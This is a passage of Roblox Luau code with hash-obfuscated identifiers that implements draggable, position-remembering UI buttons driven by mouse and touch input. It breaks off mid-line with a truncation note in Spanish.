		d061a31a3c2f278d1f1ae21305ff0f3834771368bfb9a2d1f5951a7377b9f43a.Thickness = 2
	else
		d061a31a3c2f278d1f1ae21305ff0f3834771368bfb9a2d1f5951a7377b9f43a.Color = Color3.fromRGB(115, 115, 115)
		d061a31a3c2f278d1f1ae21305ff0f3834771368bfb9a2d1f5951a7377b9f43a.Thickness = 1
	end
end

function e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.a40d0323d2528b7e824ad9ab8007b54d0366993b363e957f4218ab9d01364bbc()
	for _, de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40 in pairs(e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.cbde8049f3fdf4ae8741dabb098aa8e2a360cd68460fcb58ba7ebb3d735cb5cf) do
		e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.d42c4379ec633ab978ca01fe14b977bf37409b81b7b8b5baea1a364ec6eb7a2a(de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40)
	end
end

local function f75d1056cac62ce0906d9a95ab3d40f6b2367ee22e338f9e309661126630ca0b(de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40, d5ebd553cda3566a8c57251926743ededa989e89b082b90626dfe74802c915e8)
	local e0ced1f0255a671ffe05b4dd86fafc70e4ad50aebe31acc8fbef0e1d5f7eed0f = de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40:FindFirstChildOfClass("UICorner")
	if e0ced1f0255a671ffe05b4dd86fafc70e4ad50aebe31acc8fbef0e1d5f7eed0f then
		e0ced1f0255a671ffe05b4dd86fafc70e4ad50aebe31acc8fbef0e1d5f7eed0f.CornerRadius = UDim.new(1, 0)
	end

	local b2087ac664de73fc00dbfcf9ea0f3e070fb60454cccb0e8a5abe2bb370b9bcf9 = 6
	local fffdc54c297b7725d2b06e38927374f050f3f8b3781888173e2768fc27be9cd2 = false
	local c4464a70b63b220161ae194dcf036e890220ade2aa0b503c1484fbdc31a98c95 = false
	local dfc40449b209412a632a98342eb62e23b6c5673c4ac3335812f826f3f72b7cef = nil
	local a4b0344bab40e05c807e37695685075476753e1889ef8bb177b712c323737b99 = nil
	local e900cc948ba59ac8bd3c362cf29036abcc41f454a4e8046461e92a6dcd3da833 = ((de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40.Parent and de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40.Parent.Name) or "QuickButton") .. "/" .. (de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40.Name or "Button")

	e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.d5b9475cdaa174930bdfaccb87a8b4d109d238451d3dc7c233d08a64428c83ba[e900cc948ba59ac8bd3c362cf29036abcc41f454a4e8046461e92a6dcd3da833] = de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40.Position

	local b7952601beb3485e1a456c300352efa4f38623a0549fd246941d1d494afabc45 = e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.dda7e057cb736fcfa54d585b82c04aad18ddfc10e29442ac70ddd792cf61208c[e900cc948ba59ac8bd3c362cf29036abcc41f454a4e8046461e92a6dcd3da833]
	if b7952601beb3485e1a456c300352efa4f38623a0549fd246941d1d494afabc45 then
		de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40.Position = b7952601beb3485e1a456c300352efa4f38623a0549fd246941d1d494afabc45
	end

	e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.cbde8049f3fdf4ae8741dabb098aa8e2a360cd68460fcb58ba7ebb3d735cb5cf[e900cc948ba59ac8bd3c362cf29036abcc41f454a4e8046461e92a6dcd3da833] = de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40
	if e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.b84c22a5fe7aa424f3878dbc5c3f05c97bdb7653ac75487a0a8164fe782eab01 then
		e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.d42c4379ec633ab978ca01fe14b977bf37409b81b7b8b5baea1a364ec6eb7a2a(de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40)
	end

	local function da4bf11b029bccb29fff5e215991ae6adda5ced299d550858cd0e14185af6dbc(cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b)
		return cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b.UserInputType == Enum.UserInputType.MouseButton1 or cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b.UserInputType == Enum.UserInputType.Touch
	end

	de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40.InputBegan:Connect(function(cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b)
		if not da4bf11b029bccb29fff5e215991ae6adda5ced299d550858cd0e14185af6dbc(cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b) then
			return
		end
		c4464a70b63b220161ae194dcf036e890220ade2aa0b503c1484fbdc31a98c95 = false
		if not e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.b84c22a5fe7aa424f3878dbc5c3f05c97bdb7653ac75487a0a8164fe782eab01 then
			return
		end
		fffdc54c297b7725d2b06e38927374f050f3f8b3781888173e2768fc27be9cd2 = true
		dfc40449b209412a632a98342eb62e23b6c5673c4ac3335812f826f3f72b7cef = cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b.Position
		a4b0344bab40e05c807e37695685075476753e1889ef8bb177b712c323737b99 = de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40.Position
	end)

	local d9f2091d634d647a9dfc490b25736c43bb6c97272bfc25a719b493df1fb3909d = bcee9878e6f0472c671550126fb094f4aa84c6e053db270f2751b54781a57eab.InputChanged:Connect(function(cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b)
		if not e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.b84c22a5fe7aa424f3878dbc5c3f05c97bdb7653ac75487a0a8164fe782eab01 or not fffdc54c297b7725d2b06e38927374f050f3f8b3781888173e2768fc27be9cd2 or not dfc40449b209412a632a98342eb62e23b6c5673c4ac3335812f826f3f72b7cef then
			return
		end
		local cb37c33053dccdbafe9ed18ecefa3485e90d04c9eaa18f451a80a51c646fc12e = cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b.UserInputType
		if cb37c33053dccdbafe9ed18ecefa3485e90d04c9eaa18f451a80a51c646fc12e ~= Enum.UserInputType.Touch and cb37c33053dccdbafe9ed18ecefa3485e90d04c9eaa18f451a80a51c646fc12e ~= Enum.UserInputType.MouseMovement then
			return
		end
		local e7e64cc1abec01dea4d8ada4619a4e30f5040a7c50e5c1b1dca4daacb861f028 = cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b.Position - dfc40449b209412a632a98342eb62e23b6c5673c4ac3335812f826f3f72b7cef
		if not c4464a70b63b220161ae194dcf036e890220ade2aa0b503c1484fbdc31a98c95 and e7e64cc1abec01dea4d8ada4619a4e30f5040a7c50e5c1b1dca4daacb861f028.Magnitude > b2087ac664de73fc00dbfcf9ea0f3e070fb60454cccb0e8a5abe2bb370b9bcf9 then
			c4464a70b63b220161ae194dcf036e890220ade2aa0b503c1484fbdc31a98c95 = true
		end
		if not c4464a70b63b220161ae194dcf036e890220ade2aa0b503c1484fbdc31a98c95 then
			return
		end
		local da7f8808ecb224a2048711aada96c74112f10d9cef3954fa4e20359750bf8712 =
			UDim2.new(a4b0344bab40e05c807e37695685075476753e1889ef8bb177b712c323737b99.X.Scale, a4b0344bab40e05c807e37695685075476753e1889ef8bb177b712c323737b99.X.Offset + e7e64cc1abec01dea4d8ada4619a4e30f5040a7c50e5c1b1dca4daacb861f028.X, a4b0344bab40e05c807e37695685075476753e1889ef8bb177b712c323737b99.Y.Scale, a4b0344bab40e05c807e37695685075476753e1889ef8bb177b712c323737b99.Y.Offset + e7e64cc1abec01dea4d8ada4619a4e30f5040a7c50e5c1b1dca4daacb861f028.Y)
		de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40.Position = da7f8808ecb224a2048711aada96c74112f10d9cef3954fa4e20359750bf8712
		e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.dda7e057cb736fcfa54d585b82c04aad18ddfc10e29442ac70ddd792cf61208c[e900cc948ba59ac8bd3c362cf29036abcc41f454a4e8046461e92a6dcd3da833] = da7f8808ecb224a2048711aada96c74112f10d9cef3954fa4e20359750bf8712
	end)

	local cd1ed36129968a327484f753020b69722259cbd7e595ba7f09a2a3c867e10d5d = bcee9878e6f0472c671550126fb094f4aa84c6e053db270f2751b54781a57eab.InputEnded:Connect(function(cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b)
		if da4bf11b029bccb29fff5e215991ae6adda5ced299d550858cd0e14185af6dbc(cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b) then
			fffdc54c297b7725d2b06e38927374f050f3f8b3781888173e2768fc27be9cd2 = false
		end
	end)

	de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40.Destroying:Connect(function()
		if d9f2091d634d647a9dfc490b25736c43bb6c97272bfc25a719b493df1fb3909d then
			d9f2091d634d647a9dfc490b25736c43bb6c97272bfc25a719b493df1fb3909d:Disconnect()
		end
		if cd1ed36129968a327484f753020b69722259cbd7e595ba7f09a2a3c867e10d5d then
			cd1ed36129968a327484f753020b69722259cbd7e595ba7f09a2a3c867e10d5d:Disconnect()
		end
		if e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.cbde8049f3fdf4ae8741dabb098aa8e2a360cd68460fcb58ba7ebb3d735cb5cf[e900cc948ba59ac8bd3c362cf29036abcc41f454a4e8046461e92a6dcd3da833] == de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40 then
			e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.cbde8049f3fdf4ae8741dabb098aa8e2a360cd68460fcb58ba7ebb3d735cb5cf[e900cc948ba59ac8bd3c362cf29036abcc41f454a4e8046461e92a6dcd3da833] = nil
		end
	end)

	de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40.Activated:Connect(function()
		if e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.b84c22a5fe7aa424f3878dbc5c3f05c97bdb7653ac75487a0a8164fe782eab01 then
			return
		end
		if c4464a70b63b220161ae194dcf036e890220ade2aa0b503c1484fbdc31a98c95 then
			return
		end
		d5ebd553cda3566a8c57251926743ededa989e89b082b90626dfe74802c915e8()
	end)
end

local function a1f8ca07f0cd44076a1490e67f211b42493e1e51bfe9f0fd98ac73ce476e246e(c4bb68ac133a4ae2cce4ef3589af4384c6d495fc40148d14c59105ab87bf32c6, b7862d3624aee82a41b5e9e825252e74971f5dd252dd9801c74b02568fd20973)
	b7862d3624aee82a41b5e9e825252e74971f5dd252dd9801c74b02568fd20973 = b7862d3624aee82a41b5e9e825252e74971f5dd252dd9801c74b02568fd20973 or c4bb68ac133a4ae2cce4ef3589af4384c6d495fc40148d14c59105ab87bf32c6

	local fffdc54c297b7725d2b06e38927374f050f3f8b3781888173e2768fc27be9cd2 = false
	local dfc40449b209412a632a98342eb62e23b6c5673c4ac3335812f826f3f72b7cef = nil
	local a4b0344bab40e05c807e37695685075476753e1889ef8bb177b712c323737b99 = nil

	local function da4bf11b029bccb29fff5e215991ae6adda5ced299d550858cd0e14185af6dbc(cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b)
		return cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b.UserInputType == Enum.UserInputType.MouseButton1 or cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b.UserInputType == Enum.UserInputType.Touch
	end

	b7862d3624aee82a41b5e9e825252e74971f5dd252dd9801c74b02568fd20973.InputBegan:Connect(function(cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b)
		if not da4bf11b029bccb29fff5e215991ae6adda5ced299d550858cd0e14185af6dbc(cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b) then
			return
		end

		fffdc54c297b7725d2b06e38927374f050f3f8b3781888173e2768fc27be9cd2 = true
		dfc40449b209412a632a98342eb62e23b6c5673c4ac3335812f826f3f72b7cef = cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b.Position
		a4b0344bab40e05c807e37695685075476753e1889ef8bb177b712c323737b99 = c4bb68ac133a4ae2cce4ef3589af4384c6d495fc40148d14c59105ab87bf32c6.Position
	end)

	local d9f2091d634d647a9dfc490b25736c43bb6c97272bfc25a719b493df1fb3909d = bcee9878e6f0472c671550126fb094f4aa84c6e053db270f2751b54781a57eab.InputChanged:Connect(function(cf0f39ea0a9abe1ecbfbf571ec6fa2491a90400c960cad4243c90e89763c156b)
		if not fffdc54c297b7725d2b06e38927374f050f3f8b3781888173e2768fc27be9cd2 or not dfc40449b209412a632a98342eb62e23b6c5673c4ac3335812f826f3f72b7cef or not a4b0344bab40e05c807e37695685075476... (Tiempo restante: 626 KB)
